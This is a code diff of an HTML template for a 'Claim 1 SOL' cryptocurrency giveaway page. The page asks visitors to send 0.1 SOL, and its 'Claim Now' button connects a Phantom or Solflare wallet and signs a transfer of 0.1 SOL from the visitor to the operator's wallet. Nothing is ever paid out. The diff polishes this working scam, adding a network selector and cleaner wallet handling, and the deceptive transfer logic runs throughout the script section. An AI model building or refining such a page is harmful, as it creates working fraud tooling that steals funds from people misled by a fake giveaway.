@@ -7,33 +7,30 @@ QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/m
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Claim 1 SOL</title>
-  <meta charset="UTF-8">
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
     body {
-      background-color: black;
-      color: white;
-      text-align: center;
+      background-color: #000;
+      color: #fff;
       font-family: Arial, sans-serif;
+      text-align: center;
       padding: 40px;
     }
     .button {
       background: linear-gradient(to right, #00ff90, #00d178);
       border: none;
-      color: black;
+      color: #000;
       font-weight: bold;
       padding: 14px 30px;
       font-size: 16px;
       border-radius: 30px;
       cursor: pointer;
-      margin: 10px;
-    }
-    .button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
+      margin: 20px;
     }
     img.qr {
       width: 220px;
@@ -48,6 +45,12 @@ HTML_TEMPLATE = """
       font-size: 0.9em;
       white-space: pre-wrap;
     }
+    select {
+      margin-top: 10px;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
@@ -55,9 +58,16 @@ HTML_TEMPLATE = """
   <p>Send exactly <strong>0.1 SOL</strong> to:</p>
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
-  
-  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
-  <button class="button" id="claimBtn" style="display: none;">💸 Claim Now</button>
+
+  <div>
+    <button class="button" id="connectBtn">🔗 Connect Wallet</button>
+    <select id="networkSelect">
+      <option value="mainnet-beta">Mainnet</option>
+      <option value="devnet">Devnet</option>
+    </select>
+    <button class="button" id="claimBtn" disabled>💸 Claim Now</button>
+  </div>
+
   <div id="status">Click "Connect Wallet" to begin.</div>
 
   <script>
@@ -65,63 +75,69 @@ HTML_TEMPLATE = """
     const qr = document.getElementById("qrCode");
     const connectBtn = document.getElementById("connectBtn");
     const claimBtn = document.getElementById("claimBtn");
+    const networkSelect = document.getElementById("networkSelect");
 
     let provider = null;
     let publicKey = null;
 
-    connectBtn.addEventListener("click", async () => {
+    connectBtn.addEventListener('click', async () => {
       if (window.solana?.isPhantom) {
         provider = window.solana;
       } else if (window.solflare?.isSolflare) {
         provider = window.solflare;
       } else {
-        status.innerText = "⚠️ No wallet found. Open this in Phantom or Solflare browser.";
+        status.innerText = "⚠️ No wallet detected. Open this in Phantom or Solflare.";
         qr.style.display = "block";
         return;
       }
 
       try {
-        status.innerText = "🔄 Connecting...";
-        const resp = await provider.connect();
-        publicKey = resp?.publicKey || provider.publicKey;
+        status.innerText = "🔄 Waiting for wallet approval...";
+        const response = await provider.connect();
+        publicKey = response.publicKey || provider.publicKey;
         status.innerText = "✅ Connected: " + publicKey.toString();
-        claimBtn.style.display = "inline-block";
+        claimBtn.disabled = false;
       } catch (err) {
-        status.innerText = "❌ Wallet connection failed: " + (err.message || err);
+        console.error("Connection failed:", err);
+        status.innerText = "❌ Wallet connection failed.";
       }
     });
 
-    claimBtn.addEventListener("click", async () => {
-      if (!publicKey) {
-        status.innerText = "⚠️ Connect wallet first.";
+    claimBtn.addEventListener('click', async () => {
+      if (!provider || !publicKey) {
+        status.innerText = "❌ Wallet not connected.";
         return;
       }
 
-      try {
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const recipient = new solanaWeb3.PublicKey("{{ wallet }}");
+      const network = networkSelect.value;
+      const connection = new solanaWeb3.Connection(
+        solanaWeb3.clusterApiUrl(network),
+        'confirmed'
+      );
 
+      const recipientPubkey = new solanaWeb3.PublicKey("{{ wallet }}");
+
+      try {
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: publicKey,
-            toPubkey: recipient,
+            toPubkey: recipientPubkey,
             lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
           })
         );
 
         transaction.feePayer = publicKey;
-        let { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
+        const latestBlockhash = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = latestBlockhash.blockhash;
 
         let signed = await provider.signTransaction(transaction);
-        let txid = await connection.sendRawTransaction(signed.serialize());
-        status.innerText = "📤 Transaction sent! Waiting for confirmation...\\nTx ID: " + txid;
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
 
-        await connection.confirmTransaction(txid);
-        status.innerText = "✅ Success! Transaction confirmed.\\nTx ID: " + txid;
+        status.innerText = "✅ Transaction successful! Signature: " + signature;
       } catch (err) {
-        console.error("Transaction Error:", err);
-        status.innerText = "❌ Failed: " + (err?.message || "Unknown error");
+        console.error("Transaction failed:", err);
+        status.innerText = "❌ Transaction failed: " + err.message;
       }
     });
   </script>
